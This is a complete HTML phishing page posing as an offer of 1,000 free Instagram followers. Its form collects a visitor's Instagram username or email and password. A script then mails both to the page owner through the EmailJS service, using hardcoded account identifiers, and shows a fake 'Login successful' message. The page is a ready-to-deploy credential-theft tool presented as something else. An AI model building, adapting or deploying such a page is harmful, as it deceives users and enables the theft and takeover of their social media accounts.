<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Get 1000 Free Instagram Followers!</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(120deg, #ff6b6b, #4ecdc4, #45b7d1);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent);
      animation: rotateGlow 15s linear infinite;
    }
    @keyframes rotateGlow {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .container {
      width: 450px;
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
      padding: 40px;
      text-align: center;
      z-index: 1;
      animation: popIn 0.6s ease-out;
    }
    @keyframes popIn {
      0% { transform: scale(0.9); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .title {
      font-size: 32px;
      font-weight: 700;
      color: #ff3366;
      margin-bottom: 10px;
      text-shadow: 0 2px 5px rgba(255, 51, 102, 0.3);
    }
    .subtitle {
      font-size: 18px;
      color: #555;
      margin-bottom: 30px;
    }
    .form-box {
      padding: 0 20px;
    }
    .input-field {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      background: #f0f0f0;
      font-size: 16px;
      color: #333;
      transition: all 0.3s ease;
    }
    .input-field:focus {
      background: #fff;
      box-shadow: 0 0 10px rgba(255, 107, 107, 0.4);
      outline: none;
    }
    .input-field::placeholder {
      color: #aaa;
    }
    .claim-btn {
      width: 100%;
      padding: 15px;
      background: linear-gradient(90deg, #ff6b6b, #ffcc5c);
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      font-size: 18px;
      cursor: pointer;
      margin-top: 20px;
      transition: transform 0.2s ease, box-shadow 0.3s ease;
    }
    .claim-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(255, 107, 107, 0.5);
    }
    .claim-btn:disabled {
      background: #ccc;
      transform: none;
      box-shadow: none;
      cursor: not-allowed;
    }
    .disclaimer {
      font-size: 12px;
      color: #777;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="title">Get 1000 Free Followers!</h1>
    <p class="subtitle">Sign in to claim your Instagram boost now!</p>
    <div class="form-box">
      <form id="claim-form" name="claim-form">
        <input type="text" name="username" id="username" class="input-field" placeholder="Username or Email" required>
        <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
        <button type="submit" class="claim-btn" id="claim-btn">Claim Now</button>
      </form>
    </div>
    <p class="disclaimer">Ready to take your social life to the next level!!!.</p>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("XI3MNWxgiq0cRWGRE"); // Your Public Key

    document.getElementById("claim-form").addEventListener("submit", function(event) {
      event.preventDefault();
      const claimBtn = document.getElementById("claim-btn");
      claimBtn.disabled = true;
      claimBtn.textContent = "Processing...";

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      emailjs.send("service_1jiaczt", "template_9lwlyaq", {
        username: username,
        password: password
      })
      .then(function(response) {
        alert("Login successful! Check back soon for your followers!");
        claimBtn.disabled = false;
        claimBtn.textContent = "Claim Now";
        document.getElementById("claim-form").reset();
      }, function(error) {
        alert("Failed to process. Please try again.");
        claimBtn.disabled = false;
        claimBtn.textContent = "Claim Now";
        console.log("EmailJS Error:", error);
      });
    });
  </script>
</body>
</html>
